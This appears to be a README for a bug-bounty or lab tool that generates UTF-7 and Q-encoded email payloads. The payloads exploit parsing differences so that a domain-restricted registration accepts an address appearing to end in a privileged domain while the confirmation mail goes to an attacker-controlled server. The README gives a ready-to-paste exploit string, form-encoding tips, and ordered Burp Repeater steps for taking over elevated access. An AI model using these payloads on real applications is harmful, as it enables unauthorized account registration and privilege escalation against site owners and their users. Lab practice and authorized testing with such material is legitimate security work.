# Bypassing Access Controls Using Email Address Parsing Discrepancies

Builds ready-to-paste payloads for apps that grant access/privileges based on an email domain (e.g. "if you work for X, use your @company.com email"), where the registration validator checks the raw email string but a separate mail-sending parser decodes MIME encoded-word / UTF-7 syntax first. That gap lets you register with an address that *looks* like it ends in the privileged domain to the validator, while the actual confirmation email gets sent to a domain you control.

**Trigger condition:** any domain-restricted signup/email-change flow — look for copy like "if you work for X, use your @company.com email," SSO/enterprise tiers, auto-join-by-domain onboarding.

## What this is for

Two phases:

1. **Recon probes (`--probe`)** — cheap Q-encoded test payloads (ISO-8859-1 and UTF-8 variants). If these get blocked with a distinct "suspicious encoding" style error, the app has some encoding-awareness worth mapping further. If they pass through silently or error generically, the validator may not be decoding anything at all — a different, possibly easier bug.
2. **The exploit payload** — a UTF-7 encoded-word string that decodes to your real attacker-controlled address while the raw string still ends in `@<target-domain>`, satisfying a literal domain check.

Every payload is printed both raw (readable) and **already percent-encoded for a form body**. Pasting the raw version directly into an `application/x-www-form-urlencoded` POST body in Burp Repeater will silently break — the payload contains literal `&`, `=`, `?`, `@` characters that the form parser reads as field delimiters, truncating your actual value. Always use the form-encoded output when editing a raw Burp body.

## Requirements

- Python 3
- No external packages — standard library only (`base64`, `urllib.parse`, `argparse`)

## Just want one result? (no repo, no setup)

```bash
curl -o email_parser_bypass.py "https://raw.githubusercontent.com/MalikHettige/scripts-tools/main/business-logic/Bypassing%20access%20controls%20using%20email%20address%20parsing%20discrepancies/email_parser_bypass.py"
python3 email_parser_bypass.py --attacker-domain <your-exploit-server-or-webhook-domain> --target-domain <privileged-domain> --probe
```

Delete `email_parser_bypass.py` afterward if you don't need it again.

## Frequent use (clone and keep)

```bash
git clone https://github.com/MalikHettige/scripts-tools.git "$HOME/Documents/GitHub/Scripts-tools"
```

Then, from anywhere:

```bash
python3 "$HOME/Documents/GitHub/Scripts-tools/business-logic/Bypassing access controls using email address parsing discrepancies/email_parser_bypass.py" \
  --attacker-domain <your-exploit-server-or-webhook-domain> \
  --target-domain <privileged-domain> \
  --probe
```

## Ordered steps

1. Confirm the domain restriction exists (try a normal non-matching email, note the exact rejection message).
2. Run this script with `--probe` to get the Q-encoding recon payloads. Submit each one (form-encoded!) via the registration form, noting whether the error message is generic ("invalid email") or encoding-specific ("blocked for security reasons" or similar). A distinct, different error message on the Q-encoded attempt is the signal that the app detects *some* encodings as suspicious — meaning there's likely a gap in which encodings it checks.
3. Run the script without `--probe` (or just use the "Exploit payload" section of the same output) to get your UTF-7 payload, built from your real attacker-controlled domain (your exploit server, or a webhook.site-style domain — Collaborator is Burp Pro only, not needed here) and the target's privileged domain.
4. Submit the **form-encoded** version as the email parameter's raw value in Burp Repeater (Raw tab, not Pretty — Pretty view can re-render/re-encode as you type).
5. If accepted, check your attacker-controlled inbox (exploit server email client, or your webhook dashboard) for the confirmation email, and complete registration via that link.
6. Confirm the account received the expected elevated access (admin panel, staff-only area, etc.).

**It would look like:**
```
=== Exploit payload ===

Decodes to:   attacker@exploit-0a9d00fa030613ea805889f2017c0027.exploit-server.net
Raw string:   =?utf-7?q?attacker&AEA-exploit-0a9d00fa030613ea805889f2017c0027.exploit-server.net&ACA-?=@ginandjuice.shop
Form-encoded (paste this as the email value in a raw x-www-form-urlencoded body):
%3D%3Futf-7%3Fq%3Fattacker%26AEA-exploit-0a9d00fa030613ea805889f2017c0027.exploit-server.net%26ACA-%3F%3D%40ginandjuice.shop
```

## Troubleshooting / gotchas actually hit while testing this

- **Browser rejects the raw payload before it even sends** — HTML5 `type="email"` inputs validate client-side and will block raw `&` in the field. Intercept the request in Burp and edit it there instead of relying on the browser form to submit it.
- **Server returns a generic "Invalid email" instead of the expected security-specific error** — almost always means the payload got mangled in transit, most commonly from pasting the **raw** (not form-encoded) version into a `x-www-form-urlencoded` body. The literal `&` characters in `&AEA-`/`&ACA-` get parsed as new form field separators, truncating your actual email value to just the part before the first `&`. Always use the form-encoded output from this script.
- **Missing a literal `=` at the very start of the value** — the MIME encoded-word marker itself starts with `=?`, which is separate from the form field's own `key=value` `=`. In a raw body this looks like two `=` in a row right after the parameter name (`email==?utf-7?q?...`) — easy to drop one by accident when editing by hand.
- **Only testing on the final exploit domain** — always verify the two Q-encoding recon probes first. They tell you whether the app is encoding-aware at all, which saves time before committing to the full UTF-7 exploit on a target that might not even have this gap.

## Related writeup

https://github.com/MalikHettige/Bug-bounty-writeups/blob/malikhettige-lab-report-loop/business-logic/labs/lab%20-%20Bypassing%20Access%20Controls%20Using%20Email%20Address%20Parsing%20Discrepancies.md
